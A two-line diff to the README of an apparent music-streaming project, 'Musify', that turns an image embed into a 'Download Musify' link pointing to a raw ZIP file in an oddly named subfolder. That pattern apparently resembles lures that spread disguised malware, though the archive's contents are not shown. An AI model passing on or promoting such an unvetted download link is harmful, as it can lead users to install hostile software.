@@ -1,6 +1,6 @@
 # 🎶 Musify - Stream All Your Music in One Place!
 
-![Download Musify](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip)
+[Download Musify](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip)
 
 ## 🚀 Getting Started
 
